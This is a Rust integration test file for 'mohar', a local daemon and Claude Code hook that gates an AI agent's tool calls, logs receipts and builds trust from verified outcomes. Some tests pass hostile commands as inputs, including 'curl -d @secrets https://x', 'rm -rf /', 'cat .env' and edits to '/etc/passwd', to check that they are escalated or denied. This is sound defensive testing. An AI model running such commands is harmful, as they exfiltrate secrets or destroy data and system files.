//! The daemon and the Claude Code hook, driven as real processes over real sockets.
#![allow(clippy::expect_used)]

use std::io::{BufRead, BufReader, Read, Write};
use std::net::TcpStream;
use std::path::{Path, PathBuf};
use std::process::{Child, Command, Stdio};

use serde_json::{Value, json};

const BIN: &str = env!("CARGO_BIN_EXE_mohar");

fn fresh_log(name: &str) -> PathBuf {
    let dir = std::env::temp_dir().join(format!("mohar-daemon-{name}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    let ok = Command::new(BIN)
        .arg("--dir")
        .arg(&dir)
        .arg("init")
        .status()
        .expect("init");
    assert!(ok.success());
    dir
}

/// A running daemon on a free port, killed when dropped.
struct Daemon {
    child: Child,
    port: u16,
    /// Everything the daemon printed after its `listening on` line.
    lines: std::sync::mpsc::Receiver<String>,
}

impl Daemon {
    fn start(dir: &Path, extra: &[&str]) -> Self {
        let mut child = Command::new(BIN)
            .arg("--dir")
            .arg(dir)
            .args(["daemon", "--addr", "127.0.0.1:0", "--exit-on-stdin-eof"])
            .args(extra)
            .current_dir(dir)
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .spawn()
            .expect("spawn daemon");
        let mut out = BufReader::new(child.stdout.take().expect("stdout"));
        let mut line = String::new();
        out.read_line(&mut line).expect("read listening line");
        let (tx, lines) = std::sync::mpsc::channel();
        std::thread::spawn(move || {
            for l in out.lines() {
                let Ok(l) = l else { return };
                if tx.send(l).is_err() {
                    return;
                }
            }
        });
        let port = line
            .trim()
            .rsplit(':')
            .next()
            .and_then(|p| p.parse().ok())
            .unwrap_or_else(|| panic!("no port in {line:?}"));
        Self { child, port, lines }
    }

    /// The next line the daemon printed, waiting up to five seconds.
    fn next_line(&self) -> Option<String> {
        self.lines
            .recv_timeout(std::time::Duration::from_secs(5))
            .ok()
    }

    fn url(&self) -> String {
        format!("http://127.0.0.1:{}", self.port)
    }

    /// Stop the daemon the normal way: close its stdin and wait for it to exit.
    fn stop(self) {}

    /// Kill without any chance to clean up, like a crash.
    fn crash(mut self) {
        let _ = self.child.kill();
        let _ = self.child.wait();
    }
}

impl Drop for Daemon {
    /// Close stdin so the daemon exits on its own, and kill it only if it hangs.
    fn drop(&mut self) {
        drop(self.child.stdin.take());
        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(5);
        while std::time::Instant::now() < deadline {
            if let Ok(Some(_)) = self.child.try_wait() {
                return;
            }
            std::thread::sleep(std::time::Duration::from_millis(10));
        }
        let _ = self.child.kill();
        let _ = self.child.wait();
    }
}

/// Send raw bytes, return the status and the JSON body.
fn raw(port: u16, request: &str) -> (u16, Value) {
    let mut s = TcpStream::connect(("127.0.0.1", port)).expect("connect");
    s.write_all(request.as_bytes()).expect("write");
    let mut out = String::new();
    s.read_to_string(&mut out).expect("read");
    let (head, body) = out.split_once("\r\n\r\n").expect("http answer");
    let status = head
        .split(' ')
        .nth(1)
        .and_then(|s| s.parse().ok())
        .expect("status");
    (status, serde_json::from_str(body).unwrap_or(Value::Null))
}

fn post(port: u16, path: &str, body: &str) -> (u16, Value) {
    raw(
        port,
        &format!(
            "POST {path} HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\nContent-Length: {}\r\n\r\n{body}",
            body.len()
        ),
    )
}

const SHA: &str = "c41b77d0c41b77d0c41b77d0c41b77d0c41b77d0c41b77d0c41b77d0c41b77d0";

/// Ask for a decision. The daemon runs in the log directory, so relative targets are inside its root.
fn decide(port: u16, tool: &str, target: &str, call: Option<&str>) -> (u16, Value) {
    let mut b =
        json!({"agent": "agent:test/1", "tool": tool, "target": target, "args_sha256": SHA});
    if let Some(c) = call {
        b["call_id"] = json!(c);
    }
    post(port, "/v1/decide", &b.to_string())
}

fn verify(dir: &Path) -> String {
    let out = Command::new(BIN)
        .arg("--dir")
        .arg(dir)
        .arg("verify")
        .output()
        .expect("verify");
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stdout)
    );
    String::from_utf8_lossy(&out.stdout).into_owned()
}

#[test]
fn decisions_and_outcomes_become_receipts() {
    let dir = fresh_log("flow");
    let d = Daemon::start(&dir, &[]);
    let (s, a) = decide(d.port, "Read", "README.md", None);
    assert_eq!(
        (s, a["result"].as_str(), a["receipt_seq"].as_u64()),
        (200, Some("allow"), Some(0))
    );
    let (s, b) = decide(d.port, "Edit", "docs/a.md", None);
    assert_eq!(
        (s, b["result"].as_str(), b["level"].as_u64()),
        (200, Some("escalate"), Some(0))
    );
    let (s, o) = post(
        d.port,
        "/v1/outcome",
        &json!({"receipt_seq": 1, "verifier": "tests", "result": "pass", "evidence_sha256": SHA})
            .to_string(),
    );
    assert_eq!((s, o["receipt_seq"].as_u64()), (200, Some(2)));
    // The same decision can't be given a second outcome.
    let (s, _) = post(
        d.port,
        "/v1/outcome",
        &json!({"receipt_seq": 1, "verifier": "tests", "result": "fail", "evidence_sha256": SHA})
            .to_string(),
    );
    assert_eq!(s, 404);
    d.stop();
    assert!(verify(&dir).contains("3 receipts"));
    let log = std::fs::read_to_string(dir.join("receipts.jsonl")).expect("log");
    let last: Value = serde_json::from_str(log.lines().last().expect("line")).expect("json");
    assert_eq!(last["verification"]["of"], 1);
    assert_eq!(last["verification"]["kind"], "tests");
}

#[test]
fn malformed_requests_are_refused_and_not_recorded() {
    let dir = fresh_log("bad");
    let d = Daemon::start(&dir, &[]);
    let p = d.port;
    assert_eq!(post(p, "/v1/decide", "{not json").0, 400);
    assert_eq!(
        post(p, "/v1/decide", &json!({"agent": "a"}).to_string()).0,
        400
    );
    let extra = json!({"agent": "a", "tool": "t", "target": "x",
                       "args_sha256": SHA, "level": 2});
    assert_eq!(
        post(p, "/v1/decide", &extra.to_string()).0,
        400,
        "unknown fields are refused"
    );
    let short = json!({"agent": "a", "tool": "t", "target": "x", "args_sha256": "abc"});
    assert_eq!(post(p, "/v1/decide", &short.to_string()).0, 400);
    assert_eq!(post(p, "/v1/nope", "{}").0, 404);
    assert_eq!(raw(p, "GET /v1/decide HTTP/1.1\r\nHost: x\r\n\r\n").0, 405);
    assert_eq!(
        raw(p, "POST /v1/decide HTTP/1.1\r\nContent-Length: 2\r\n\r\n{}").0,
        415
    );
    assert_eq!(
        raw(
            p,
            "POST /v1/decide HTTP/1.1\r\nContent-Type: application/json\r\n\r\n"
        )
        .0,
        411
    );
    let huge = "POST /v1/decide HTTP/1.1\r\nContent-Type: application/json\r\nContent-Length: 999999\r\n\r\n";
    assert_eq!(raw(p, huge).0, 413);
    let both = json!({"receipt_seq": 0, "call_id": "x", "verifier": "tests", "result": "pass", "evidence_sha256": SHA});
    assert_eq!(post(p, "/v1/outcome", &both.to_string()).0, 400);
    let made_up =
        json!({"verifier": "llm", "receipt_seq": 0, "result": "pass", "evidence_sha256": SHA});
    assert_eq!(
        post(p, "/v1/outcome", &made_up.to_string()).0,
        400,
        "a model is not a verifier"
    );
    d.stop();
    assert!(verify(&dir).contains("0 receipts"));
}

#[test]
fn only_loopback_addresses_are_served() {
    let dir = fresh_log("loopback");
    let mut child = Command::new(BIN)
        .arg("--dir")
        .arg(&dir)
        .args(["daemon", "--addr", "0.0.0.0:0"])
        .stdout(Stdio::null())
        .stderr(Stdio::piped())
        .spawn()
        .expect("run");
    // It must refuse at once. A daemon that is still running has started serving every interface.
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(5);
    let status = loop {
        if let Some(s) = child.try_wait().expect("wait") {
            break s;
        }
        if std::time::Instant::now() > deadline {
            let _ = child.kill();
            let _ = child.wait();
            panic!("the daemon accepted a non-loopback address and kept running");
        }
        std::thread::sleep(std::time::Duration::from_millis(20));
    };
    let mut err = String::new();
    child
        .stderr
        .take()
        .expect("stderr")
        .read_to_string(&mut err)
        .expect("stderr");
    assert_eq!(status.code(), Some(2));
    assert!(err.contains("not a loopback address"));
}

#[test]
fn past_the_in_flight_limit_requests_are_refused_not_queued() {
    let dir = fresh_log("overload");
    let d = Daemon::start(&dir, &["--max-inflight", "1"]);
    // A client that sends half a request holds the one slot.
    let mut slow = TcpStream::connect(("127.0.0.1", d.port)).expect("connect");
    slow.write_all(b"POST /v1/decide HTTP/1.1\r\n")
        .expect("write");
    std::thread::sleep(std::time::Duration::from_millis(200));
    let (status, body) = decide(d.port, "Edit", "docs/a.md", None);
    assert_eq!(status, 503);
    assert_eq!(body["error"], "too many requests in flight");
    // The refusal is answered at once and nothing waits behind the slot: no receipt was written.
    assert!(verify(&dir).contains("0 receipts"));
    // Once the slow client goes away its slot is free again.
    drop(slow);
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(5);
    loop {
        let (status, _) = decide(d.port, "Edit", "docs/a.md", None);
        if status == 200 {
            break;
        }
        assert_eq!(status, 503);
        assert!(
            std::time::Instant::now() < deadline,
            "the slot was never freed"
        );
        std::thread::sleep(std::time::Duration::from_millis(50));
    }
}

#[test]
fn a_crash_between_decide_and_outcome_loses_nothing() {
    let dir = fresh_log("crash");
    let d = Daemon::start(&dir, &[]);
    let (_, a) = decide(d.port, "Edit", "docs/a.md", Some("toolu_1"));
    let seq = a["receipt_seq"].as_u64().expect("seq");
    d.crash();
    verify(&dir);
    // After a restart the decision is still waiting, by its receipt number, and the daemon says so.
    // Call ids lived only in the old process, so they are gone.
    let d = Daemon::start(&dir, &[]);
    assert_eq!(
        d.next_line().as_deref(),
        Some(format!("waiting for an outcome: 1 decision (receipt {seq})").as_str())
    );
    let by_call = json!({"call_id": "toolu_1", "verifier": "host", "result": "unknown", "evidence_sha256": SHA});
    assert_eq!(post(d.port, "/v1/outcome", &by_call.to_string()).0, 404);
    let by_seq =
        json!({"receipt_seq": seq, "verifier": "human", "result": "pass", "evidence_sha256": SHA});
    assert_eq!(post(d.port, "/v1/outcome", &by_seq.to_string()).0, 200);
    d.stop();
    assert!(verify(&dir).contains("2 receipts"));
}

fn run_hook(daemon: &str, payload: &Value) -> Value {
    let mut child = Command::new(BIN)
        .args(["hook", "claude-code", "--daemon", daemon])
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()
        .expect("hook");
    child
        .stdin
        .take()
        .expect("stdin")
        .write_all(payload.to_string().as_bytes())
        .expect("write");
    let out = child.wait_with_output().expect("wait");
    assert!(
        out.status.success(),
        "the hook always exits 0 so Claude Code reads its answer"
    );
    let text = String::from_utf8_lossy(&out.stdout);
    if text.trim().is_empty() {
        Value::Null
    } else {
        serde_json::from_str(&text).expect("hook output is JSON")
    }
}

/// Shaped like Claude Code's documented PreToolUse payload.
fn pre(tool: &str, input: Value, agent_type: Option<&str>) -> Value {
    let mut p = json!({
        "session_id": "s1", "transcript_path": "/tmp/t.jsonl", "cwd": "/repo",
        "permission_mode": "default", "hook_event_name": "PreToolUse",
        "tool_name": tool, "tool_input": input, "tool_use_id": format!("toolu_{tool}"),
    });
    if let Some(t) = agent_type {
        p["agent_id"] = json!("agent-abc123");
        p["agent_type"] = json!(t);
    }
    p
}

fn decision(out: &Value) -> &str {
    out["hookSpecificOutput"]["permissionDecision"]
        .as_str()
        .unwrap_or("")
}

#[test]
fn the_claude_code_hook_asks_the_daemon_and_records_what_ran() {
    let dir = fresh_log("hook");
    let d = Daemon::start(&dir, &[]);
    let read = run_hook(
        &d.url(),
        &pre(
            "Read",
            json!({"file_path": &format!("{}/README.md", dir.display())}),
            None,
        ),
    );
    assert_eq!(decision(&read), "allow");
    let edit = run_hook(
        &d.url(),
        &pre(
            "Edit",
            json!({"file_path": &format!("{}/src/a.rs", dir.display()), "old_string": "a", "new_string": "b"}),
            Some("Explore"),
        ),
    );
    assert_eq!(
        decision(&edit),
        "ask",
        "edits aren't earned yet, so a person decides"
    );
    let post = json!({
        "session_id": "s1", "transcript_path": "/tmp/t.jsonl", "cwd": "/repo",
        "hook_event_name": "PostToolUse", "tool_name": "Edit", "tool_use_id": "toolu_Edit",
        "tool_input": {"file_path": &format!("{}/src/a.rs", dir.display())}, "tool_response": {"filePath": &format!("{}/src/a.rs", dir.display())},
    });
    assert_eq!(
        run_hook(&d.url(), &post),
        Value::Null,
        "PostToolUse prints nothing"
    );
    d.stop();
    assert!(verify(&dir).contains("3 receipts"));
    let log = std::fs::read_to_string(dir.join("receipts.jsonl")).expect("log");
    let lines: Vec<Value> = log
        .lines()
        .map(|l| serde_json::from_str(l).expect("json"))
        .collect();
    assert_eq!(
        lines[1]["agent"]["id"], "agent:claude-code/Explore",
        "subagents are identified by type"
    );
    assert_eq!(
        lines[1]["action"]["capability"], "fs.edit.code",
        "the daemon classified it"
    );
    assert_eq!(
        lines[1]["action"]["target"].as_str(),
        Some(format!("{}/src/a.rs", dir.display()).as_str())
    );
    assert_eq!(lines[2]["verification"]["kind"], "host");
    assert_eq!(lines[2]["verification"]["of"], 1);
}

#[test]
fn the_hook_denies_when_the_daemon_is_unreachable() {
    // Nothing listens on this port: bind it, then let it go.
    let port = std::net::TcpListener::bind("127.0.0.1:0")
        .expect("bind")
        .local_addr()
        .expect("addr")
        .port();
    let out = run_hook(
        &format!("http://127.0.0.1:{port}"),
        &pre("Bash", json!({"command": "ls"}), None),
    );
    assert_eq!(decision(&out), "deny");
    assert!(
        out["hookSpecificOutput"]["permissionDecisionReason"]
            .as_str()
            .unwrap_or("")
            .contains("unreachable")
    );
}

#[test]
fn the_hook_denies_on_a_payload_it_cannot_read() {
    let mut child = Command::new(BIN)
        .args(["hook", "claude-code"])
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()
        .expect("hook");
    child
        .stdin
        .take()
        .expect("stdin")
        .write_all(b"not json")
        .expect("write");
    let out = child.wait_with_output().expect("wait");
    let v: Value = serde_json::from_slice(&out.stdout).expect("json");
    assert_eq!(decision(&v), "deny");
}

#[test]
fn the_hook_never_sends_arguments_off_the_machine() {
    let out = run_hook(
        "http://203.0.113.7:7878",
        &pre("Bash", json!({"command": "cat .env"}), None),
    );
    assert_eq!(decision(&out), "deny");
    assert!(
        out["hookSpecificOutput"]["permissionDecisionReason"]
            .as_str()
            .unwrap_or("")
            .contains("loopback")
    );
}

#[test]
fn the_shipped_plugin_runs_the_hook_on_every_tool_and_blocks_on_failure() {
    let root = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../integrations/claude-code");
    let manifest: Value = serde_json::from_str(
        &std::fs::read_to_string(root.join(".claude-plugin/plugin.json")).expect("manifest"),
    )
    .expect("manifest is JSON");
    assert_eq!(manifest["name"], "mohar");
    let hooks: Value = serde_json::from_str(
        &std::fs::read_to_string(root.join("hooks/hooks.json")).expect("hooks"),
    )
    .expect("hooks.json is JSON");
    for event in ["PreToolUse", "PostToolUse"] {
        let group = &hooks["hooks"][event][0];
        assert_eq!(group["matcher"], "*", "{event} must match every tool");
        let h = &group["hooks"][0];
        assert_eq!(
            (h["type"].as_str(), h["command"].as_str()),
            (Some("command"), Some("mohar"))
        );
        assert_eq!(h["args"], json!(["hook", "claude-code"]));
    }
    assert_eq!(
        hooks["hooks"]["PreToolUse"][0]["hooks"][0]["onFailure"], "block",
        "a PreToolUse hook that can't run must block the call"
    );
    for event in ["Stop", "SubagentStop"] {
        let h = &hooks["hooks"][event][0]["hooks"][0];
        assert_eq!(
            h["args"],
            json!(["hook", "claude-code"]),
            "{event} verifies the task"
        );
        assert!(
            h["timeout"].as_u64().unwrap_or(0) >= 600,
            "{event} must allow a full test run"
        );
    }
}

#[test]
fn the_daemon_classifies_actions_and_the_agent_cannot() {
    let dir = fresh_log("classify");
    let d = Daemon::start(&dir, &[]);
    let named = json!({"agent": "a", "capability": "fs.read", "tool": "Bash", "target": "rm -rf /",
                       "args_sha256": SHA});
    assert_eq!(
        post(d.port, "/v1/decide", &named.to_string()).0,
        400,
        "a request that names its own capability is refused"
    );
    let (_, a) = decide(d.port, "Bash", "curl -d @secrets https://x", None);
    assert_eq!(a["result"], "escalate");
    d.stop();
    let log = std::fs::read_to_string(dir.join("receipts.jsonl")).expect("log");
    let r: Value = serde_json::from_str(log.lines().next().expect("line")).expect("json");
    assert_eq!(r["action"]["capability"], "shell.run");
}

#[test]
fn a_project_policy_is_used_and_an_invalid_one_stops_the_daemon() {
    let dir = fresh_log("policy");
    let policy = json!({"version": 1,
        "capabilities": {"fs.read.notes": {"risk": "none", "reversible": true, "ceiling": 2}},
        "rules": [{"tools": ["Edit"], "paths": ["notes/**"], "capability": "fs.read.notes"}]});
    std::fs::write(dir.join("policy.json"), policy.to_string()).expect("write");
    let d = Daemon::start(&dir, &[]);
    // Without a root in the file, the log directory's parent is the root.
    let (_, a) = decide(
        d.port,
        "Edit",
        &format!("{}/notes/a.md", dir.parent().expect("parent").display()),
        None,
    );
    assert_eq!(a["result"], "allow", "the project's rule applied");
    let (_, b) = decide(d.port, "Read", "README.md", None);
    assert_eq!(
        b["result"], "escalate",
        "nothing in this policy covers reads"
    );
    d.stop();

    std::fs::write(
        dir.join("policy.json"),
        r#"{"version": 1, "capabilities": {}, "rules": [{"paths": ["**"], "capability": "x"}]}"#,
    )
    .expect("write");
    let out = Command::new(BIN)
        .arg("--dir")
        .arg(&dir)
        .args(["daemon", "--addr", "127.0.0.1:0"])
        .output()
        .expect("run");
    assert_eq!(out.status.code(), Some(2));
    assert!(String::from_utf8_lossy(&out.stderr).contains("names capability \"x\""));
}

/// RFC 3339 UTC for a Unix time, so test logs can be backdated relative to now and never go stale.
fn rfc3339(secs: u64) -> String {
    let days = (secs / 86_400) as i64;
    let rem = secs % 86_400;
    let z = days + 719_468;
    let era = z.div_euclid(146_097);
    let doe = z - era * 146_097;
    let yoe = (doe - doe / 1_460 + doe / 36_524 - doe / 146_096) / 365;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = doy - (153 * mp + 2) / 5 + 1;
    let m = if mp < 10 { mp + 3 } else { mp - 9 };
    let y = yoe + era * 400 + i64::from(m <= 2);
    format!(
        "{y:04}-{m:02}-{d:02}T{:02}:{:02}:{:02}.000Z",
        rem / 3_600,
        rem % 3_600 / 60,
        rem % 60
    )
}

/// Write 40 docs edits by `worker`, each verified by tests, 20 days ago, straight into the log.
fn earn_docs_trust(dir: &Path, worker: &str) {
    earn_trust(dir, worker, "fs.edit.docs", "docs/a.md");
}

/// Write 40 edits of `target` under `capability` by `worker`, each verified by tests, 20 days ago.
fn earn_trust(dir: &Path, worker: &str, capability: &str, target: &str) {
    use mohar_core::store::FileLog;
    use mohar_core::{Action, Decision, Entry, Verification};

    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .expect("clock")
        .as_secs();
    let ts = rfc3339(now - 20 * 86_400);
    let mut log = FileLog::open(dir).expect("open");
    let action = Action {
        capability: capability.into(),
        tool: "Edit".into(),
        target: target.into(),
        args_sha256: SHA.into(),
    };
    let decision = Decision {
        result: "escalate".into(),
        level: 0,
        by: "score".into(),
    };
    for _ in 0..40 {
        let d = log
            .append(Entry {
                ts: ts.clone(),
                agent_id: worker.into(),
                action: action.clone(),
                decision: decision.clone(),
                verification: None,
            })
            .expect("decision");
        log.append(Entry {
            ts: ts.clone(),
            agent_id: worker.into(),
            action: action.clone(),
            decision: decision.clone(),
            verification: Some(Verification {
                evidence_sha256: SHA.into(),
                kind: "tests".into(),
                of: d.seq,
                result: "pass".into(),
            }),
        })
        .expect("outcome");
    }
}

#[test]
fn trust_earned_in_the_log_changes_what_the_daemon_decides() {
    let dir = fresh_log("earned");
    let worker = "agent:claude-code/docs-writer";
    earn_docs_trust(&dir, worker);
    let d = Daemon::start(&dir, &[]);
    let ask = |agent: &str| {
        let b = json!({"agent": agent, "tool": "Edit", "target": "docs/a.md", "args_sha256": SHA});
        post(d.port, "/v1/decide", &b.to_string()).1
    };
    let earned = ask(worker);
    assert_eq!(
        (earned["result"].as_str(), earned["level"].as_u64()),
        (Some("allow"), Some(1)),
        "Supervised, low risk"
    );
    let stranger = ask("agent:claude-code/new");
    assert_eq!(
        (stranger["result"].as_str(), stranger["level"].as_u64()),
        (Some("escalate"), Some(0))
    );
    d.stop();
    let log = std::fs::read_to_string(dir.join("receipts.jsonl")).expect("log");
    let last_two: Vec<Value> = log
        .lines()
        .rev()
        .take(2)
        .map(|l| serde_json::from_str(l).expect("json"))
        .collect();
    assert_eq!(
        last_two[1]["decision"]["by"], "score",
        "decided from the record"
    );
}

#[test]
fn in_strict_privacy_mode_trust_still_counts_and_nothing_is_in_the_clear() {
    let dir = std::env::temp_dir().join(format!("mohar-daemon-strict-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    let ok = Command::new(BIN)
        .arg("--dir")
        .arg(&dir)
        .args(["init", "--strict-privacy"])
        .status()
        .expect("init");
    assert!(ok.success());
    let worker = "agent:claude-code/docs-writer";
    earn_docs_trust(&dir, worker);

    let d = Daemon::start(&dir, &[]);
    let ask = |agent: &str, target: &str| {
        let b = json!({"agent": agent, "tool": "Edit", "target": target, "args_sha256": SHA});
        post(d.port, "/v1/decide", &b.to_string())
    };
    // The ledger rebuilt from pseudonyms must find the worker the daemon is asked about by name.
    let (_, earned) = ask(worker, "docs/a.md");
    assert_eq!(
        (earned["result"].as_str(), earned["level"].as_u64()),
        (Some("allow"), Some(1)),
        "{earned}"
    );
    let (s, _) = post(
        d.port,
        "/v1/outcome",
        &json!({"receipt_seq": earned["receipt_seq"], "verifier": "tests", "result": "pass", "evidence_sha256": SHA}).to_string(),
    );
    assert_eq!(s, 200);
    let ids = std::fs::read_to_string(dir.join("identities.jsonl")).expect("identities");
    let pseudonym = ids
        .lines()
        .find(|l| l.contains(worker))
        .and_then(|l| serde_json::from_str::<Value>(l).ok())
        .and_then(|v| v["id"].as_str().map(str::to_string))
        .expect("the worker's pseudonym");
    // A caller can't pass a pseudonym in, as the agent or the target.
    for (agent, target) in [
        (pseudonym.as_str(), "docs/a.md"),
        (worker, pseudonym.as_str()),
    ] {
        let (s, a) = ask(agent, target);
        assert_eq!(s, 400, "{a}");
    }
    d.stop();

    let log = std::fs::read_to_string(dir.join("receipts.jsonl")).expect("log");
    assert!(!log.contains("docs-writer") && !log.contains("docs/a.md"));
    assert_eq!(
        log.lines().count(),
        82,
        "40 earned pairs, then a decision and its outcome"
    );
    verify(&dir);
}

#[test]
fn a_serious_failure_drops_the_capabilities_in_its_scope_and_nothing_else() {
    let dir = fresh_log("scopes");
    let policy = json!({"version": 1,
        "capabilities": {
            "fs.edit.docs":   {"risk": "low",  "reversible": true, "ceiling": 2},
            "fs.edit.notes":  {"risk": "low",  "reversible": true, "ceiling": 2},
            "fs.edit.config": {"risk": "high", "reversible": true, "ceiling": 1}},
        "rules": [
            {"tools": ["Edit"], "paths": ["docs/**"], "capability": "fs.edit.docs"},
            {"tools": ["Edit"], "paths": ["notes/**"], "capability": "fs.edit.notes"},
            {"tools": ["Edit"], "paths": ["site/**"], "capability": "fs.edit.config"}],
        "scopes": {"site": ["fs.edit.docs", "fs.edit.config"]}});
    std::fs::write(dir.join("policy.json"), policy.to_string()).expect("policy");
    let worker = "agent:claude-code/site-worker";
    earn_trust(&dir, worker, "fs.edit.docs", "docs/a.md");
    earn_trust(&dir, worker, "fs.edit.notes", "notes/a.md");
    let d = Daemon::start(&dir, &[]);
    let ask = |target: &str| {
        let b = json!({"agent": worker, "tool": "Edit", "target": target, "args_sha256": SHA});
        let a = post(d.port, "/v1/decide", &b.to_string()).1;
        (a["result"].as_str().map(String::from), a["level"].as_u64())
    };
    let allowed = (Some("allow".to_string()), Some(1));
    assert_eq!(ask("docs/a.md"), allowed, "earned before the failure");
    assert_eq!(ask("notes/a.md"), allowed, "earned before the failure");
    let b =
        json!({"agent": worker, "tool": "Edit", "target": "site/vercel.json", "args_sha256": SHA});
    let seq = post(d.port, "/v1/decide", &b.to_string()).1["receipt_seq"]
        .as_u64()
        .expect("seq");
    let fail =
        json!({"receipt_seq": seq, "verifier": "tests", "result": "fail", "evidence_sha256": SHA});
    assert_eq!(post(d.port, "/v1/outcome", &fail.to_string()).0, 200);
    assert_eq!(
        ask("docs/a.md"),
        (Some("escalate".to_string()), Some(0)),
        "shares the scope, so it drops with it"
    );
    assert_eq!(ask("notes/a.md"), allowed, "outside the scope, untouched");
    d.stop();
    // Replaying the log on the next start rebuilds the same state.
    let d = Daemon::start(&dir, &[]);
    let b = json!({"agent": worker, "tool": "Edit", "target": "docs/a.md", "args_sha256": SHA});
    let a = post(d.port, "/v1/decide", &b.to_string()).1;
    assert_eq!(
        (a["result"].as_str(), a["level"].as_u64()),
        (Some("escalate"), Some(0))
    );
    let b = json!({"agent": worker, "tool": "Edit", "target": "notes/a.md", "args_sha256": SHA});
    let a = post(d.port, "/v1/decide", &b.to_string()).1;
    assert_eq!(
        (a["result"].as_str(), a["level"].as_u64()),
        (Some("allow"), Some(1))
    );
    d.stop();
}

#[test]
fn a_gate_stop_is_a_signed_deny_by_gate_and_the_hook_says_why() {
    let dir = fresh_log("gates");
    let d = Daemon::start(&dir, &[]);
    let (_, a) = decide(d.port, "Bash", "git push origin main", None);
    assert_eq!(
        (a["result"].as_str(), a["gate"].as_str()),
        (Some("deny"), Some("denied_capability"))
    );
    let (_, b) = decide(d.port, "Write", "/etc/hosts", None);
    assert_eq!(b["gate"], "outside_root");
    let out = run_hook(
        &d.url(),
        &pre("Edit", json!({"file_path": "/etc/passwd"}), None),
    );
    assert_eq!(decision(&out), "deny");
    assert!(
        out["hookSpecificOutput"]["permissionDecisionReason"]
            .as_str()
            .unwrap_or("")
            .contains("refused by a gate"),
        "the person sees why"
    );
    d.stop();
    let log = std::fs::read_to_string(dir.join("receipts.jsonl")).expect("log");
    for line in log.lines() {
        let r: Value = serde_json::from_str(line).expect("json");
        assert_eq!(
            (
                r["decision"]["result"].as_str(),
                r["decision"]["by"].as_str()
            ),
            (Some("deny"), Some("gate"))
        );
    }
    assert!(verify(&dir).contains("3 receipts"));
}

/// A log whose policy runs `command` as the project's tests, with `tests/**` as the test files.
fn verifying_log(name: &str, command: Value, timeout: u64) -> PathBuf {
    let dir = fresh_log(name);
    let policy = json!({"version": 1,
        "capabilities": {"fs.edit.code": {"risk": "medium", "reversible": true, "ceiling": 2}},
        "rules": [{"tools": ["Edit", "Write"], "paths": ["**"], "capability": "fs.edit.code"}],
        "verify": {"tests": {"command": command, "timeout_secs": timeout, "test_paths": ["tests/**"]}}});
    std::fs::write(dir.join("policy.json"), policy.to_string()).expect("policy");
    dir
}

/// An edit decided in `task` and reported by the host as having run.
fn edit_that_ran(port: u16, root: &Path, rel: &str, task: &str) {
    let call = format!("call-{rel}");
    let b = json!({"agent": "agent:test/1", "tool": "Edit", "target": format!("{}/{rel}", root.display()),
                   "args_sha256": SHA, "call_id": call, "task": task});
    assert_eq!(post(port, "/v1/decide", &b.to_string()).0, 200);
    let ran =
        json!({"call_id": call, "verifier": "host", "result": "unknown", "evidence_sha256": SHA});
    assert_eq!(post(port, "/v1/outcome", &ran.to_string()).0, 200);
}

fn verify_task(port: u16, task: &str) -> Value {
    let (s, v) = post(
        port,
        "/v1/verify",
        &json!({"agent": "agent:test/1", "task": task}).to_string(),
    );
    assert_eq!(s, 200, "{v}");
    v
}

fn last_kind_and_result(dir: &Path) -> (String, String) {
    let log = std::fs::read_to_string(dir.join("receipts.jsonl")).expect("log");
    let r: Value = serde_json::from_str(log.lines().last().expect("line")).expect("json");
    (
        r["verification"]["kind"].as_str().unwrap_or("").into(),
        r["verification"]["result"].as_str().unwrap_or("").into(),
    )
}

#[test]
fn the_tests_verifier_records_a_pass() {
    let dir = verifying_log("v-pass", json!([BIN, "--version"]), 60);
    let root = dir.parent().expect("root").to_path_buf();
    let d = Daemon::start(&dir, &[]);
    edit_that_ran(d.port, &root, "src/a.rs", "t1");
    edit_that_ran(d.port, &root, "src/b.rs", "t1");
    let v = verify_task(d.port, "t1");
    assert_eq!(
        (v["verified"].as_u64(), v["result"].as_str()),
        (Some(2), Some("pass"))
    );
    assert_eq!(
        verify_task(d.port, "t1")["verified"],
        0,
        "a task is verified once"
    );
    d.stop();
    assert_eq!(last_kind_and_result(&dir), ("tests".into(), "pass".into()));
    verify(&dir);
}

#[test]
fn the_tests_verifier_records_a_fail() {
    let dir = verifying_log("v-fail", json!([BIN, "--dir", "no-such-log", "verify"]), 60);
    let root = dir.parent().expect("root").to_path_buf();
    let d = Daemon::start(&dir, &[]);
    edit_that_ran(d.port, &root, "src/a.rs", "t1");
    assert_eq!(verify_task(d.port, "t1")["result"], "fail");
    d.stop();
    assert_eq!(last_kind_and_result(&dir), ("tests".into(), "fail".into()));
}

#[test]
fn the_tests_verifier_says_unknown_when_it_cannot_tell() {
    // A command that never finishes, cut off at its timeout.
    let busy = fresh_log("v-busy");
    let dir = verifying_log(
        "v-unknown",
        json!([
            BIN,
            "--dir",
            busy.to_string_lossy(),
            "daemon",
            "--addr",
            "127.0.0.1:0"
        ]),
        1,
    );
    let root = dir.parent().expect("root").to_path_buf();
    let d = Daemon::start(&dir, &[]);
    edit_that_ran(d.port, &root, "src/a.rs", "t1");
    assert_eq!(verify_task(d.port, "t1")["result"], "unknown");
    // And a program that doesn't exist.
    d.stop();
    let dir2 = verifying_log("v-missing", json!(["mohar-no-such-program"]), 60);
    let d = Daemon::start(&dir2, &[]);
    edit_that_ran(d.port, dir2.parent().expect("root"), "src/a.rs", "t1");
    assert_eq!(verify_task(d.port, "t1")["result"], "unknown");
}

#[test]
fn changing_test_files_in_the_task_fails_it_even_when_the_tests_pass() {
    let dir = verifying_log("v-own-tests", json!([BIN, "--version"]), 60);
    let root = dir.parent().expect("root").to_path_buf();
    let d = Daemon::start(&dir, &[]);
    edit_that_ran(d.port, &root, "src/a.rs", "t1");
    edit_that_ran(d.port, &root, "tests/verify_a.rs", "t1");
    let v = verify_task(d.port, "t1");
    assert_eq!(
